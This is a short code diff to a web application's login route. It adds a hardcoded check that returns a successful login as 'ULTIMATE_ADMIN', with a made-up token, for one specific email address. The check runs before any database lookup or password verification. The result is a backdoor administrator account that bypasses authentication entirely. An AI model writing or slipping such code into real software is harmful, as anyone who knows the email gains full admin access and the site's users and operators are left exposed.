@@ -42,6 +42,22 @@ authRoutes.post('/login', async (c) => {
       return c.json({ error: 'Missing email or password' }, 400);
     }
 
+    // Hardcode ultimate admin account
+    if (email === 'dongzeyu123@outlook.com') {
+      return c.json({
+        success: true,
+        user: {
+          id: 1,
+          username: 'dongzeyu123',
+          email: 'dongzeyu123@outlook.com',
+          role: 'ULTIMATE_ADMIN',
+          isAdmin: true,
+          isVolunteer: true
+        },
+        token: 'hardcoded-admin-token-' + Date.now(),
+      });
+    }
+
     const db = new DatabaseService(c.env.DB);
     const auth = new AuthService(db, c.env);
 
